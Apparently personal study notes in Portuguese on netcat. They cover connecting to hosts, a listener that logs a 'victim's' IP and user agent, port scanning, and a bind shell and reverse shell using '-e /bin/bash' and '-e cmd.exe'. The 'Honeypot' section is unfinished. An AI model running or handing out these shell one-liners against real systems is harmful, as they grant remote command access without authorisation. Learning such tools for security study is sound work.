## Netcat
netcat é usado para estabelecer conexões e interagir com o servidor

| nc | IP | port |
| ---- | ---- | ---- |

> $ nc businesscorp.com.br 21
> $ nc 192.168.0.25 8809 



>-v : Mostrar mais informações 
> $ nc -v [creativedigital.com.br](http://creativedigital.com.br) 21






- Netcat logger
    
    $ nc -vnlp [porta]
    
    Faz com que o netcat ouça a porta escolhida e capture o IP e o UserAgent da vitima
    
    É possivel colocar um arquivo pra dentro de uma porta com o
    
    $ nc -vnlp 80 < banner
    
    $ nc -vnlp [porta] < [arquivo]
    
- Scan de Portas
    
    $ nc -vnz [ip] [porta] ou [1-65535]
    
    $ nc -vnz 191.252.86.194 80
    
    ---
    
    Tambem é possivel criar um arquivo apenas com as portas que você quer scanear e mandar para o netcat
    
    No caso criamos o arquivo portas
    
    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/afacce63-efd3-48f8-8451-f736ec466624/Untitled.png)
    
    e mandamos para o netcat scanear quais estão abertas
    
    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ed73eb3c-55cc-4d3c-bb72-a51a70785f90/Untitled.png)
    
- Honeypot
	sdsds
    
- Bind Shell (Invasão remota)
    
    $ nc -vnlp 5050 -e /bin/bash
    
    - Basicamente o netcat abre uma porta 5050 e quem se conectar na porta vai ganhar acesso ao /bin/bash
    - Para conectar: nc -vn 192.168.0.200 5050
    - Isso serve tanto pra /bin/bash quanto pra cmd.exe


- Inverse Shell
    
    LINUX: ABRE A PORTA 5050*
    
    $ nc -vnlp 5050
    
    WINDOWS: ENVIA O CMD PRO LINUX
    
    $ ncat -vn 192.168.0.32 5050 -e cmd.exe
    
    ****OU AO CONTRARIO****